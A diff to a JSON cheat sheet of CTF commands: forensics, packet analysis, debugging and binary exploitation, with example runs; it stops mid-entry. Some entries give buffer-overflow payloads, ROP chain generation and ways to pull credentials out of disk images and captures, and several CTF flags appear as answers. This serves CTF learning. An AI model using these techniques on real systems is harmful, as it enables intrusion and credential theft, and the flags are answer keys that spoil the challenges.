@@ -25,7 +25,7 @@
     [
       "GDB",
       "Commands",
-      "0",
+      "210",
       "No",
       "printf \"%s\", \u003caddress\u003e",
       "Print an ASCII string.",
@@ -724,7 +724,7 @@
       "fls \u003cfile_system\u003e",
       "Lists the files and directory names in a file system. \nIt will process the contents of a given directory and can display information on deleted files.",
       "https://wiki.sleuthkit.org/index.php?title=Fls",
-      "# fls animals.dd \nr/r 4:\tdachshund.jpg\nr/r * 6:\tfox.jpg\nr/r 8:\tfrog.jpg\nr/r * 10:\tgiraffe.jpg\nr/r 12:\tmusic.jpg\nr/r * 14:\trabbit2.jpg\nr/r 16:\trabbit.jpg\nr/r * 18:\ttheflag.jpg\nv/v 327027:\t$MBR\nv/v 327028:\t$FAT1\nv/v 327029:\t$FAT2\nV/V 327030:\t$OrphanFiles"
+      "# fls animals.dd \nr/r 4:        dachshund.jpg\nr/r * 6:        fox.jpg\nr/r 8:        frog.jpg\nr/r * 10:        giraffe.jpg\nr/r 12:        music.jpg\nr/r * 14:        rabbit2.jpg\nr/r 16:        rabbit.jpg\nr/r * 18:        theflag.jpg\nv/v 327027:        $MBR\nv/v 327028:        $FAT1\nv/v 327029:        $FAT2\nV/V 327030:        $OrphanFiles\n\n# fls -pr family.ntfs | grep -i txt\nr/r 185-128-2:  Program Files/Windows Defender/ThirdPartyNotices.txt\nr/r 244-128-2:  Program Files/windows nt/tabletextservice/TableTextServiceArray.txt\nr/r 245-128-2:  Program Files/windows nt/tabletextservice/TableTextServiceDaYi.txt\nr/r 246-128-2:  Program Files/windows nt/tabletextservice/TableTextServiceTigrinya.txt\nr/r 247-128-2:  Program Files/windows nt/tabletextservice/TableTextServiceYi.txt\nr/r 522-128-2:  Program Files/WindowsApps/Microsoft.MicrosoftSolitaireCollection_4.0.1301.0_x86__8wekyb3d8bbwe/ThirdPartyNotices.txt\nr/r 860-128-2:  Program Files/WindowsApps/Microsoft.Print3D_3.3.791.0_x64__8wekyb3d8bbwe/GCode.txt\nr/r 1156-128-2: Program Files/WindowsApps/Microsoft.WebMediaExtensions_1.0.13321.0_x64__8wekyb3d8bbwe/Third Party Notices.txt\nr/r 1507-128-2: Program Files/WindowsApps/Microsoft.Xbox.TCUI_1.24.10001.0_x64__8wekyb3d8bbwe/ThirdPartyNotice.txt\nr/r 1760-128-2: Program Files (x86)/windows nt/tabletextservice/TableTextServiceArray.txt\nr/r 1761-128-2: Program Files (x86)/windows nt/tabletextservice/TableTextServiceDaYi.txt\nr/r 1762-128-2: Program Files (x86)/windows nt/tabletextservice/TableTextServiceTigrinya.txt\nr/r 1763-128-2: Program Files (x86)/windows nt/tabletextservice/TableTextServiceYi.txt\nr/r 13288-128-2:        Users/Family/Documents/credentials.txt\nr/r 13288-128-4:        Users/Family/Documents/credentials.txt:FILE0"
     ],
     [
       "Forensics",
@@ -734,7 +734,7 @@
       "icat \u003cfile_system\u003e \u003cinode_id\u003e",
       "Outputs the contents of a file in a disk image to STDOUT.",
       "https://wiki.sleuthkit.org/index.php?title=Icat",
-      "# fls animals.dd \nr/r 4:\tdachshund.jpg\nr/r * 6:\tfox.jpg\nr/r 8:\tfrog.jpg\nr/r * 10:\tgiraffe.jpg\nr/r 12:\tmusic.jpg\nr/r * 14:\trabbit2.jpg\nr/r 16:\trabbit.jpg\nr/r * 18:\ttheflag.jpg\nv/v 327027:\t$MBR\nv/v 327028:\t$FAT1\nv/v 327029:\t$FAT2\nV/V 327030:\t$OrphanFiles\n# icat animals.dd 18 \u003e theflag.jpg"
+      "# fls animals.dd \nr/r 4:        dachshund.jpg\nr/r * 6:        fox.jpg\nr/r 8:        frog.jpg\nr/r * 10:        giraffe.jpg\nr/r 12:        music.jpg\nr/r * 14:        rabbit2.jpg\nr/r 16:        rabbit.jpg\nr/r * 18:        theflag.jpg\nv/v 327027:        $MBR\nv/v 327028:        $FAT1\nv/v 327029:        $FAT2\nV/V 327030:        $OrphanFiles\n# icat animals.dd 18 \u003e theflag.jpg\n\n# icat family.ntfs 13288-128-4 \u003e out.bin"
     ],
     [
       "Forensics",
@@ -835,7 +835,7 @@
     ],
     [
       "Command Line",
-      "Snippets",
+      "Standard Input and Output\n",
       "0",
       "No",
       "{ echo \"name\"; echo 'a_reAllY_s3cuRe_p4s$word_56b977';} | cat",
@@ -1095,7 +1095,7 @@
       "tshark -nr \u003ccapture\u003e -Y '\u003cfilter\u003e'",
       "Display all frames from a network capture which comply with filter.\n\nAdd '-x' for a full hex dump of the packets.\n\nAlternatively, use '-T json' to display readable JSON format.",
       "",
-      "root@kali:/media/sf_CTFs/pico/admin_panel# tshark -nr data.pcap -Y 'frame contains \"password\"'\nRunning as user \"root\" and group \"root\". This could be dangerous.\ntshark: Lua: Error during loading:\n [string \"/usr/share/wireshark/init.lua\"]:32: dofile has been disabled due to running Wireshark as superuser. See https://wiki.wireshark.org/CaptureSetup/CapturePrivileges for help in running Wireshark as an unprivileged user.\n    8   0.004782 192.168.3.128 → 192.168.3.129 HTTP 2354 HTTP/1.0 200 OK  (text/html) 80 37556\n   17  12.370383 192.168.3.129 → 192.168.3.128 HTTP 522 POST /login HTTP/1.1  (application/x-www-form-urlencoded) 37894 80\n   21  12.373739 192.168.3.128 → 192.168.3.129 HTTP 569 HTTP/1.0 302 FOUND  (text/html) 80 37894\n   27  12.434002 192.168.3.129 → 192.168.3.128 HTTP 480 GET /admin HTTP/1.1  37896 80\n   43  14.662211 192.168.3.129 → 192.168.3.128 HTTP 486 GET /logout HTTP/1.1  37946 80\n   47  14.665356 192.168.3.128 → 192.168.3.129 HTTP 653 HTTP/1.0 302 FOUND  (text/html) 80 37946\n   60  14.675592 192.168.3.128 → 192.168.3.129 HTTP 906 HTTP/1.0 200 OK  (text/html) 80 37948\n   68  37.234879 192.168.3.129 → 192.168.3.128 HTTP 542 POST /login HTTP/1.1  (application/x-www-form-urlencoded)[Packet size limited during capture] 38526 80\n\nroot@kali:/media/sf_CTFs/pico/admin_panel# tshark -nr data.pcap -Y 'frame.number==68' -x\nRunning as user \"root\" and group \"root\". This could be dangerous.\ntshark: Lua: Error during loading:\n [string \"/usr/share/wireshark/init.lua\"]:32: dofile has been disabled due to running Wireshark as superuser. See https://wiki.wireshark.org/CaptureSetup/CapturePrivileges for help in running Wireshark as an unprivileged user.\n0000  00 0c 29 1c df f2 00 0c 29 79 dc c4 08 00 45 00   ..).....)y....E.\n0010  02 10 f6 7c 40 00 40 06 ba 19 c0 a8 03 81 c0 a8   ...|@.@.........\n0020  03 80 96 7e 00 50 12 95 30 5d 2e 5b be 02 80 18   ...~.P..0].[....\n0030  00 e5 8a 54 00 00 01 01 08 0a 18 8c 0c 8d f0 d7   ...T............\n0040  91 77 50 4f 53 54 20 2f 6c 6f 67 69 6e 20 48 54   .wPOST /login HT\n0050  54 50 2f 31 2e 31 0d 0a 48 6f 73 74 3a 20 31 39   TP/1.1..Host: 19\n0060  32 2e 31 36 38 2e 33 2e 31 32 38 0d 0a 55 73 65   2.168.3.128..Use\n0070  72 2d 41 67 65 6e 74 3a 20 4d 6f 7a 69 6c 6c 61   r-Agent: Mozilla\n0080  2f 35 2e 30 20 28 58 31 31 3b 20 55 62 75 6e 74   /5.0 (X11; Ubunt\n0090  75 3b 20 4c 69 6e 75 78 20 78 38 36 5f 36 34 3b   u; Linux x86_64;\n00a0  20 72 76 3a 35 39 2e 30 29 20 47 65 63 6b 6f 2f    rv:59.0) Gecko/\n00b0  32 30 31 30 30 31 30 31 20 46 69 72 65 66 6f 78   20100101 Firefox\n00c0  2f 35 39 2e 30 0d 0a 41 63 63 65 70 74 3a 20 74   /59.0..Accept: t\n00d0  65 78 74 2f 68 74 6d 6c 2c 61 70 70 6c 69 63 61   ext/html,applica\n00e0  74 69 6f 6e 2f 78 68 74 6d 6c 2b 78 6d 6c 2c 61   tion/xhtml+xml,a\n00f0  70 70 6c 69 63 61 74 69 6f 6e 2f 78 6d 6c 3b 71   pplication/xml;q\n0100  3d 30 2e 39 2c 2a 2f 2a 3b 71 3d 30 2e 38 0d 0a   =0.9,*/*;q=0.8..\n0110  41 63 63 65 70 74 2d 4c 61 6e 67 75 61 67 65 3a   Accept-Language:\n0120  20 65 6e 2d 55 53 2c 65 6e 3b 71 3d 30 2e 35 0d    en-US,en;q=0.5.\n0130  0a 41 63 63 65 70 74 2d 45 6e 63 6f 64 69 6e 67   .Accept-Encoding\n0140  3a 20 67 7a 69 70 2c 20 64 65 66 6c 61 74 65 0d   : gzip, deflate.\n0150  0a 52 65 66 65 72 65 72 3a 20 68 74 74 70 3a 2f   .Referer: http:/\n0160  2f 31 39 32 2e 31 36 38 2e 33 2e 31 32 38 2f 0d   /192.168.3.128/.\n0170  0a 43 6f 6e 74 65 6e 74 2d 54 79 70 65 3a 20 61   .Content-Type: a\n0180  70 70 6c 69 63 61 74 69 6f 6e 2f 78 2d 77 77 77   pplication/x-www\n0190  2d 66 6f 72 6d 2d 75 72 6c 65 6e 63 6f 64 65 64   -form-urlencoded\n01a0  0d 0a 43 6f 6e 74 65 6e 74 2d 4c 65 6e 67 74 68   ..Content-Length\n01b0  3a 20 35 33 0d 0a 43 6f 6e 6e 65 63 74 69 6f 6e   : 53..Connection\n01c0  3a 20 6b 65 65 70 2d 61 6c 69 76 65 0d 0a 55 70   : keep-alive..Up\n01d0  67 72 61 64 65 2d 49 6e 73 65 63 75 72 65 2d 52   grade-Insecure-R\n01e0  65 71 75 65 73 74 73 3a 20 31 0d 0a 0d 0a 75 73   equests: 1....us\n01f0  65 72 3d 61 64 6d 69 6e 26 70 61 73 73 77 6f 72   er=admin&passwor\n0200  64 3d 70 69 63 6f 43 54 46 7b 6e 30 74 73 33 63   d=picoCTF{n0ts3c\n0210  75 72 33 5f 39 66 65 65 64 66 62 63 7d            ur3_9feedfbc}"
+      "root@kali:/media/sf_CTFs/pico/admin_panel# tshark -nr data.pcap -Y 'frame contains \"password\"'\nRunning as user \"root\" and group \"root\". This could be dangerous.\ntshark: Lua: Error during loading:\n [string \"/usr/share/wireshark/init.lua\"]:32: dofile has been disabled due to running Wireshark as superuser. See https://wiki.wireshark.org/CaptureSetup/CapturePrivileges for help in running Wireshark as an unprivileged user.\n    8   0.004782 192.168.3.128 → 192.168.3.129 HTTP 2354 HTTP/1.0 200 OK  (text/html) 80 37556\n   17  12.370383 192.168.3.129 → 192.168.3.128 HTTP 522 POST /login HTTP/1.1  (application/x-www-form-urlencoded) 37894 80\n   21  12.373739 192.168.3.128 → 192.168.3.129 HTTP 569 HTTP/1.0 302 FOUND  (text/html) 80 37894\n   27  12.434002 192.168.3.129 → 192.168.3.128 HTTP 480 GET /admin HTTP/1.1  37896 80\n   43  14.662211 192.168.3.129 → 192.168.3.128 HTTP 486 GET /logout HTTP/1.1  37946 80\n   47  14.665356 192.168.3.128 → 192.168.3.129 HTTP 653 HTTP/1.0 302 FOUND  (text/html) 80 37946\n   60  14.675592 192.168.3.128 → 192.168.3.129 HTTP 906 HTTP/1.0 200 OK  (text/html) 80 37948\n   68  37.234879 192.168.3.129 → 192.168.3.128 HTTP 542 POST /login HTTP/1.1  (application/x-www-form-urlencoded)[Packet size limited during capture] 38526 80\n\nroot@kali:/media/sf_CTFs/pico/admin_panel# tshark -nr data.pcap -Y 'frame.number==68' -x\nRunning as user \"root\" and group \"root\". This could be dangerous.\ntshark: Lua: Error during loading:\n [string \"/usr/share/wireshark/init.lua\"]:32: dofile has been disabled due to running Wireshark as superuser. See https://wiki.wireshark.org/CaptureSetup/CapturePrivileges for help in running Wireshark as an unprivileged user.\n0000  00 0c 29 1c df f2 00 0c 29 79 dc c4 08 00 45 00   ..).....)y....E.\n0010  02 10 f6 7c 40 00 40 06 ba 19 c0 a8 03 81 c0 a8   ...|@.@.........\n0020  03 80 96 7e 00 50 12 95 30 5d 2e 5b be 02 80 18   ...~.P..0].[....\n0030  00 e5 8a 54 00 00 01 01 08 0a 18 8c 0c 8d f0 d7   ...T............\n0040  91 77 50 4f 53 54 20 2f 6c 6f 67 69 6e 20 48 54   .wPOST /login HT\n0050  54 50 2f 31 2e 31 0d 0a 48 6f 73 74 3a 20 31 39   TP/1.1..Host: 19\n0060  32 2e 31 36 38 2e 33 2e 31 32 38 0d 0a 55 73 65   2.168.3.128..Use\n0070  72 2d 41 67 65 6e 74 3a 20 4d 6f 7a 69 6c 6c 61   r-Agent: Mozilla\n0080  2f 35 2e 30 20 28 58 31 31 3b 20 55 62 75 6e 74   /5.0 (X11; Ubunt\n0090  75 3b 20 4c 69 6e 75 78 20 78 38 36 5f 36 34 3b   u; Linux x86_64;\n00a0  20 72 76 3a 35 39 2e 30 29 20 47 65 63 6b 6f 2f    rv:59.0) Gecko/\n00b0  32 30 31 30 30 31 30 31 20 46 69 72 65 66 6f 78   20100101 Firefox\n00c0  2f 35 39 2e 30 0d 0a 41 63 63 65 70 74 3a 20 74   /59.0..Accept: t\n00d0  65 78 74 2f 68 74 6d 6c 2c 61 70 70 6c 69 63 61   ext/html,applica\n00e0  74 69 6f 6e 2f 78 68 74 6d 6c 2b 78 6d 6c 2c 61   tion/xhtml+xml,a\n00f0  70 70 6c 69 63 61 74 69 6f 6e 2f 78 6d 6c 3b 71   pplication/xml;q\n0100  3d 30 2e 39 2c 2a 2f 2a 3b 71 3d 30 2e 38 0d 0a   =0.9,*/*;q=0.8..\n0110  41 63 63 65 70 74 2d 4c 61 6e 67 75 61 67 65 3a   Accept-Language:\n0120  20 65 6e 2d 55 53 2c 65 6e 3b 71 3d 30 2e 35 0d    en-US,en;q=0.5.\n0130  0a 41 63 63 65 70 74 2d 45 6e 63 6f 64 69 6e 67   .Accept-Encoding\n0140  3a 20 67 7a 69 70 2c 20 64 65 66 6c 61 74 65 0d   : gzip, deflate.\n0150  0a 52 65 66 65 72 65 72 3a 20 68 74 74 70 3a 2f   .Referer: http:/\n0160  2f 31 39 32 2e 31 36 38 2e 33 2e 31 32 38 2f 0d   /192.168.3.128/.\n0170  0a 43 6f 6e 74 65 6e 74 2d 54 79 70 65 3a 20 61   .Content-Type: a\n0180  70 70 6c 69 63 61 74 69 6f 6e 2f 78 2d 77 77 77   pplication/x-www\n0190  2d 66 6f 72 6d 2d 75 72 6c 65 6e 63 6f 64 65 64   -form-urlencoded\n01a0  0d 0a 43 6f 6e 74 65 6e 74 2d 4c 65 6e 67 74 68   ..Content-Length\n01b0  3a 20 35 33 0d 0a 43 6f 6e 6e 65 63 74 69 6f 6e   : 53..Connection\n01c0  3a 20 6b 65 65 70 2d 61 6c 69 76 65 0d 0a 55 70   : keep-alive..Up\n01d0  67 72 61 64 65 2d 49 6e 73 65 63 75 72 65 2d 52   grade-Insecure-R\n01e0  65 71 75 65 73 74 73 3a 20 31 0d 0a 0d 0a 75 73   equests: 1....us\n01f0  65 72 3d 61 64 6d 69 6e 26 70 61 73 73 77 6f 72   er=admin&passwor\n0200  64 3d 70 69 63 6f 43 54 46 7b 6e 30 74 73 33 63   d=picoCTF{n0ts3c\n0210  75 72 33 5f 39 66 65 65 64 66 62 63 7d            ur3_9feedfbc}\n\nroot@kali:/media/sf_CTFs/google/Satellite# tshark -nr osmium.pcapng  -Y 'frame contains \"password\"' -T fields -e data.text -o data.show_as_text:TRUE\nRunning as user \"root\" and group \"root\". This could be dangerous.\nUsername: brewtoot password: CTF{4efcc72090af28fd33a2118985541f92e793477f}      166.00 IS-19 2019/05/09 00:00:00       Swath 640km      Revisit capacity twice daily, anywhere Resolution panchromatic: 30cm multispectral: 1.2m        Daily acquisition capacity: 220,000km Remaining config data written to: https://docs.google.com/document/d/14eYPluD_pi3824GAFanS29tWdTcKxP_XUxx7e303-3E"
     ],
     [
       "Executables",
@@ -1112,7 +1112,7 @@
       "john",
       "20",
       "No",
-      "zip2john \u003czip_file\u003e \u003e \u003cpassword_file\u003e",
+      "zip2john \u003czip_file\u003e",
       "Encode a zip file's password in a format John can crack.",
       "https://dfir.science/2014/07/how-to-cracking-zip-and-rar-protected.html",
       "# ~/utils/john/run/zip2john output/65 \u003e zip.hashes\nver 1.0 efh 5455 efh 7875 65/password.txt PKZIP Encr: 2b chk, TS_chk, cmplen=44, decmplen=32, crc=4341BA5D\nroot@kali:/media/sf_CTFs/google/obscurety/new# cat zip.hashes\n65/password.txt:$pkzip2$1*2*2*0*2c*20*4341ba5d*0*46*0*2c*4341*6eab*327fdc864aefd7fd5a7462f9355e15e84fc09d4e7d3a5ecd1318f77f7f6f2c86b62edc0a6d7eb87cba92a613*$/pkzip2$:password.txt:65::output/65"
@@ -1219,7 +1219,7 @@
     ],
     [
       "Command Line",
-      "Snippets",
+      "Standard Input and Output\n",
       "0",
       "No",
       "cat \u003c(python -c \"print(('A' * 76) + '\\x08\\x87\\x04\\x08')\") - | ./authme",
@@ -1229,7 +1229,7 @@
     ],
     [
       "Command Line",
-      "Snippets",
+      "Standard Input and Output\n",
       "0",
       "No",
       "(python -c \"print(('A' * 76) + '\\x08\\x87\\x04\\x08')\"; cat) | ./authme",
@@ -1524,6 +1524,524 @@
       "Raw HTTP GET with Cookie.",
       "",
       "GET /settings HTTP/1.0\nCookie: SID=123; Domain=.missilesystem.com; Expires=Tue, 11-Jun-2019 19:59:23 GMT; Path=/"
+    ],
+    [
+      "Forensics",
+      "File Systems",
+      "40",
+      "No",
+      "getfattr \u003cfile\u003e",
+      "Get extended attributes of filesystem objects.\n\nUse --only-values to dump out the raw extended attribute value(s) without encoding them.",
+      "https://linux.die.net/man/1/getfattr",
+      "$ sudo mount -t ntfs family.ntfs /mnt/m\n$ getfattr credentials.txt\n# file: credentials.txt\nuser.FILE0\n$ getfattr -n user.FILE0 --only-values credentials.txt \u003e img.png\n$ sudo umount /mnt/m"
+    ],
+    [
+      "Executables",
+      "Radare2",
+      "190",
+      "No",
+      "bf \u003cobject\u003e",
+      "Change the block size to value specified by an object.\nUseful when used before printing a buffer via 'pc?'. Without calling this command, the default size will be printed regardless of the actual object size.",
+      "https://radare.gitbooks.io/radare2book/basic_commands/block_size.html",
+      "[0x00000ae0]\u003e bf obj.secret\n[0x00000ae0]\u003e pc @ obj.secret\n#define _BUFFER_SIZE 71\nconst uint8_t buffer[_BUFFER_SIZE] = {\n  0x8b, 0xaa, 0x2e, 0xee, 0xe8, 0xbb, 0xae, 0x8e, 0xbb, 0xae,\n  0x3a, 0xee, 0x8e, 0xee, 0xa8, 0xee, 0xae, 0xe3, 0xaa, 0xe3,\n  0xae, 0xbb, 0x8b, 0xae, 0xb8, 0xea, 0xae, 0x2e, 0xba, 0x2e,\n  0xae, 0x8a, 0xee, 0xa3, 0xab, 0xa3, 0xbb, 0xbb, 0x8b, 0xbb,\n  0xb8, 0xae, 0xee, 0x2a, 0xee, 0x2e, 0x2a, 0xb8, 0xaa, 0x8e,\n  0xaa, 0x3b, 0xaa, 0x3b, 0xba, 0x8e, 0xa8, 0xeb, 0xa3, 0xa8,\n  0xaa, 0x28, 0xbb, 0xb8, 0xae, 0x2a, 0xe2, 0xee, 0x3a, 0xb8,\n  0x00\n};"
+    ],
+    [
+      "GDB",
+      "Commands",
+      "3",
+      "No",
+      "gdb -ex \u003ccommand\u003e",
+      "Execute commands fromt the command line.",
+      "http://man7.org/linux/man-pages/man1/gdb.1.html",
+      "# gdb -ex 'set disable-randomization on' -ex 'dprintf *0x555555554ea4, \"Result: %lld\\n\", $rax' -ex 'r \u003c\u003c\u003c \"0\\n\"' -ex 'q' ./test 2\u003e&1 | grep \"Result\" -A 1\nResult: -1077552436"
+    ],
+    [
+      "GDB",
+      "Commands",
+      "211",
+      "No",
+      "dprintf \u003caddress\u003e, \u003cformat string\u003e, \u003cvariables...\u003e",
+      "Combines a breakpoint with formatted printing of the program’s data.",
+      "https://doc.ecoscentric.com/gnutools/doc/gdb/Dynamic-Printf.html",
+      "# gdb -ex 'set disable-randomization on' -ex 'dprintf *0x555555554ea4, \"Result: %lld\\n\", $rax' -ex 'r \u003c\u003c\u003c \"0\\n\"' -ex 'q' ./test 2\u003e&1 | grep \"Result\" -A 1\nResult: -1077552436"
+    ],
+    [
+      "Executables",
+      "Linker",
+      "10",
+      "No",
+      "LD_PRELOAD=\u003clibrary\u003e \u003cexecutable\u003e",
+      "A list of additional, user-specified, ELF shared objects to be loaded before all others.  \nThis feature can be used to selectively override functions in other shared objects.",
+      "http://man7.org/linux/man-pages/man8/ld.so.8.html",
+      "# LD_PRELOAD=/root/utils/preeny/x86_64-linux-gnu/dealarm.so ./times-up-one-last-time"
+    ],
+    [
+      "Executables",
+      "Linker",
+      "11",
+      "No",
+      "LD_DEBUG=all",
+      "Output verbose debugging information about operation of the dynamic linker.",
+      "http://man7.org/linux/man-pages/man8/ld.so.8.html",
+      "# LD_DEBUG=all LD_PRELOAD=/root/utils/preeny/x86_64-linux-gnu/dealarm.so ./times-up-one-last-time"
+    ],
+    [
+      "Executables",
+      "ASLR",
+      "10",
+      "No",
+      "\u003cdisable ASLR for a Windows binary\u003e",
+      "Disable ASLR for a Windows Binary:\n\nOpen with \"CFF Explorer\" -\u003e NT Headers -\u003e Optional Headers -\u003e DllCharacteristics -\u003e Click Here -\u003e DLL can move -\u003e Uncheck -\u003e Save"
+    ],
+    [
+      "Forensics",
+      "Diff",
+      "10",
+      "No",
+      "cmp -l \u003cfile1\u003e \u003cfile2\u003e",
+      "Detail the binary difference between two files.\nNote that cmp uses a decimal system for offsets and octal for bytes.",
+      "https://linux.die.net/man/1/cmp",
+      "# cmp -l cattos.jpg kitters.jpg\n  49734 160 231\n  49735 151 235\n  49736 143 230\n  49737 157 310\n  87663 103  12\n 162650 124 364"
+    ],
+    [
+      "Network and Web",
+      "tshark",
+      "50",
+      "No",
+      "tshark -r \u003cpcap_file\u003e  -o \"ssl.debug_file:ssldebug.log\" -o \"ssl.desegment_ssl_records: TRUE\" -o \"ssl.desegment_ssl_application_data: TRUE\" -o \"ssl.keys_list:\u003cip\u003e,\u003cport\u003e,http,\u003ckey_file\u003e\" -qz follow,ssl,ascii,\u003cstream_number\u003e",
+      "Decode TLS stream.",
+      "https://www.wireshark.org/docs/man-pages/tshark.html",
+      "# tshark -r capture.pcap  -o \"ssl.debug_file:ssldebug.log\" -o \"ssl.desegment_ssl_records: TRUE\" -o \"ssl.desegment_ssl_application_data: TRUE\" -o \"ssl.keys_list:172.31.22.220,443,http,picopico.key\" -qz follow,ssl,ascii,0\nRunning as user \"root\" and group \"root\". This could be dangerous.\n\n===================================================================\nFollow: ssl,ascii\nFilter: tcp.stream eq 0\nNode 0: 128.237.140.23:57567\nNode 1: :0\n426\nGET /starter-template.css HTTP/1.1\nHost: ec2-18-223-184-200.us-east-2.compute.amazonaws.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/css,*/*;q=0.1\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\nReferer: https://ec2-18-223-184-200.us-east-2.compute.amazonaws.com/\nPragma: no-cache\nCache-Control: no-cache\n\n\n        481\nHTTP/1.1 200 OK\nDate: Fri, 23 Aug 2019 15:56:36 GMT\nServer: Apache/2.4.29 (Ubuntu)\nLast-Modified: Mon, 12 Aug 2019 16:47:05 GMT\nETag: \"62-58fee462bf227-gzip\"\nAccept-Ranges: bytes\nVary: Accept-Encoding\nContent-Encoding: gzip\nPico-Flag: picoCTF{nongshim.shrimp.crackers}\nContent-Length: 100\nKeep-Alive: timeout=5, max=100\nConnection: Keep-Alive\nContent-Type: text/css"
+    ],
+    [
+      "Network and Web",
+      "tshark",
+      "51",
+      "No",
+      "tshark -r \u003cpcap_file\u003e  -o \"ssl.debug_file:ssldebug.log\" -o \"ssl.desegment_ssl_records: TRUE\" -o \"ssl.desegment_ssl_application_data: TRUE\" -o \"ssl.keys_list:\u003cip\u003e,\u003cport\u003e,http,\u003ckey_file\u003e\" -o \"tcp.desegment_tcp_streams: TRUE\" -o \"tcp.no_subdissector_on_error: FALSE\" --export-objects \"http,\u003coutput_folder\u003e\"",
+      "Export HTTPS objects.",
+      "https://www.wireshark.org/docs/man-pages/tshark.html",
+      "root@kali:/media/sf_CTFs/pico/WebNet1# mkdir out\nroot@kali:/media/sf_CTFs/pico/WebNet1# tshark -r capture.pcap  -o \"ssl.debug_file:ssldebug.log\" -o \"ssl.desegment_ssl_records: TRUE\" -o \"ssl.desegment_ssl_application_data: TRUE\" -o \"ssl.keys_list:172.31.22.220,443,http,picopico.key\" -o \"tcp.desegment_tcp_streams: TRUE\" -o \"tcp.no_subdissector_on_error: FALSE\" --export-objects \"http,out\""
+    ],
+    [
+      "Executables",
+      "GCC",
+      "10",
+      "No",
+      "gcc \u003cfile.c\u003e -o \u003cfile\u003e",
+      "Compile C program.",
+      "https://linux.die.net/man/1/gcc",
+      "# gcc main.c -o main "
+    ],
+    [
+      "Executables",
+      "GCC",
+      "11",
+      "No",
+      "gcc \u003cfile.c\u003e -o \u003cfile\u003e -O3",
+      "Compile C program with the highest optimizations.",
+      "https://linux.die.net/man/1/gcc",
+      "# gcc main.c -o main -O3"
+    ],
+    [
+      "Command Line",
+      "Standard Input and Output\n",
+      "0",
+      "No",
+      "coproc \u003cprocess\u003e",
+      "Start a command as a background job, setting up pipes connected to both its stdin and stdout.",
+      "https://www.gnu.org/software/bash/manual/html_node/Coprocesses.html",
+      "$ coproc ./times-up\n[1] 1921638\n$ read LINE \u003c&${COPROC[0]}\n$ echo $(echo ${LINE:11} | bc) \u003e&${COPROC[1]}\n$ cat \u003c&${COPROC[0]}\nSetting alarm...\npicoCTF{Gotta go fast. Gotta go FAST. #1626a7fb}\nSolution? Congrats! Here is the flag!\n[1]+  Done                    coproc COPROC ./times-up"
+    ],
+    [
+      "Network and Web",
+      "tshark",
+      "11",
+      "No",
+      "\u003cScan all streams\u003e",
+      "Scan all streams using a tshark script.\n\nSee snippet in example.",
+      "https://osqa-ask.wireshark.org/questions/17903/how-do-i-view-all-streams-in-follow-tcp-streams",
+      "# PCAP=capture.pcap; END=$(tshark -r $PCAP -T fields -e udp.stream | sort -n | tail -1); for ((i=0;i\u003c=END;i++)); do printf \"\\n=-=-=-= %d =-=-=-=\\n\" $i; tshark -r\n$PCAP -Y \"udp.stream eq $i\" -T fields -e data.text -o data.show_as_text:TRUE 2\u003e/dev/null | tr -d '\\n'; echo \"\"; done\nRunning as user \"root\" and group \"root\". This could be dangerous.\n\n=-=-=-= 0 =-=-=-=\ntest\n\n=-=-=-= 1 =-=-=-=\nabcde\n"
+    ],
+    [
+      "Executables",
+      "Exploit",
+      "11",
+      "No",
+      "ROPgadget --binary \u003cbinary\u003e --ropchain  --badbytes \u003cbad_bytes\u003e",
+      "Create a ROP gadget for a given binary, without including certain bytes.",
+      "https://github.com/JonathanSalwan/ROPgadget",
+      "ROPgadget --binary ./vuln  --ropchain --badbytes 0a"
+    ],
+    [
+      "Executables",
+      "Buffer Overflow",
+      "11",
+      "No",
+      "cyclic -n 8 \u003cnumber\u003e",
+      "Generate a unique sequence of \u003cnumber\u003e elements to help exploit buffer overflows in a 64-bit executable",
+      "http://docs.pwntools.com/en/stable/util/cyclic.html",
+      "# cyclic -n 8 100 | ./vuln\nWelcome to 64-bit. Give me a string that gets you the flag:\nSegmentation fault (core dumped)"
+    ],
+    [
+      "Executables",
+      "Buffer Overflow",
+      "21",
+      "No",
+      "cyclic -n 8 -l \u003clookup_value\u003e",
+      "Search for the location of the given value in the cyclic pattern, given a 64-bit executable.",
+      "http://docs.pwntools.com/en/stable/util/cyclic.html",
+      "# cyclic -n 8 -l 0x616161616161616a\n72"
+    ],
+    [
+      "Executables",
+      "Radare2",
+      "200",
+      "No",
+      "oo+",
+      "Move to write mode.",
+      "https://radare.gitbooks.io/radare2book/basic_commands/mapping_files.html",
+      "[0x00000841]\u003e oo+\n[0x00000841]\u003e s 0x00000845\n[0x00000845]\u003e pd 1\n|           0x00000845      c745fc1c07c2.  mov dword [var_4h], 0xd8c2071c\n[0x00000845]\u003e wa mov dword [rbp-0x4], 0xec61038f\nWritten 7 byte(s) (mov dword [rbp-0x4], 0xec61038f) = wx c745fc8f0361ec"
+    ],
+    [
+      "Forensics",
+      "Steganography",
+      "40",
+      "No",
+      "steghide extract -sf \u003cfile\u003e -p \u003cpassword\u003e",
+      "Extract hidden files embedded into media files using steghide.",
+      "http://steghide.sourceforge.net/documentation.php",
+      "# steghide extract -sf message.wav -p hidden_stegosaurus\nwrote extracted data to \"steganopayload12154.txt\"."
+    ],
+    [
+      "Crypto",
+      "RSA",
+      "0",
+      "No",
+      "yafu \"factor(\u003cnumber\u003e)\"",
+      "Factorize numbers.",
+      "https://github.com/DarkenCode/yafu",
+      "# yafu \"factor(36724645416481)\"\n\n\nfac: factoring 36724645416481\nfac: using pretesting plan: normal\nfac: no tune info: using qs/gnfs crossover of 95 digits\ndiv: primes less than 10000\nfmt: 1000000 iterations\nTotal factoring time = 0.0218 seconds\n\n\n***factors found***\n\nP2 = 11\nP2 = 17\nP4 = 1721\nP9 = 114113003\n\nans = 1"
+    ],
+    [
+      "Executables",
+      "GCC",
+      "30",
+      "No",
+      "gcc -masm=intel -m32 \u003cfile.c\u003e -o \u003cfile\u003e",
+      "Compile and assemble with 32-bit Intel syntax.",
+      "",
+      "gcc -masm=intel -m32 solution.c -o solution"
+    ],
+    [
+      "Executables",
+      "GCC",
+      "40",
+      "No",
+      "gcc -masm=intel -m32 -c \u003cfile.s\u003e -o \u003cfile.o\u003e",
+      "Compile and assemble pure assembly file with 32-bit Intel syntax - create object file.",
+      "",
+      "# gcc -masm=intel -m32 -c test.S -o test.o\n# gcc -m32 -c main.c -o main.o\n# gcc -m32 test.o main.o -o main"
+    ],
+    [
+      "Network and Web",
+      "Flask",
